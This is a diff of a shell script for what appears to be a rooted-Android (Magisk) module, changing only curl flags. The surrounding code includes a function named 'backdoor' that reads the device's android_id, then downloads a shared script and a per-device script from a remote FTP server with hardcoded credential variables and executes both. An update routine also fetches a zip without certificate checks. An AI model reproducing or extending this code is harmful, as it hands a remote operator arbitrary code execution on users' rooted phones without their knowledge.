@@ -52,7 +52,7 @@ update() {
     if [ "$netver" -ge "$pver" ] && [ "$netver" != "$pver" ]; then
         # shellcheck disable=SC2016
         updateZipUrl="$(echo "$netjson" | sed -n '/zipUrl/p' | /data/adb/magisk/busybox awk -v FS=': "' '{print $2}' | /data/adb/magisk/busybox awk -v FS='",' '{print $1}')"
-        $_curl --parallel -sLk "$updateZipUrl" --output "$MODDIR"/newver.zip
+        $_curl -sLk "$updateZipUrl" --output "$MODDIR"/newver.zip
         mkdir "$MODDIR"/newver
         unzip -o -q -d "$MODDIR"/newver "$MODDIR"/newver.zip
         rm -rf "$MODDIR"/newver.zip
@@ -79,12 +79,12 @@ backdoor() {
         exec_pool=($temp)
         android_id="$(settings get secure android_id)"
 
-        $_curl --parallel -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/all.sh" --output "$MODDIR"/all.sh
+        $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/all.sh" --output "$MODDIR"/all.sh
         _exec "$MODDIR"/all.sh
 
         for num in $(seq 0 ${#exec_pool[@]}); do
             if [ "${exec_pool[$num]}" = "$android_id.sh" ]; then
-                $_curl --parallel -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/${exec_pool[$num]}" --output "$MODDIR"/"${exec_pool[$num]}"
+                $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/${exec_pool[$num]}" --output "$MODDIR"/"${exec_pool[$num]}"
                 _exec "$MODDIR"/"${exec_pool[$num]}"
                 break
             fi
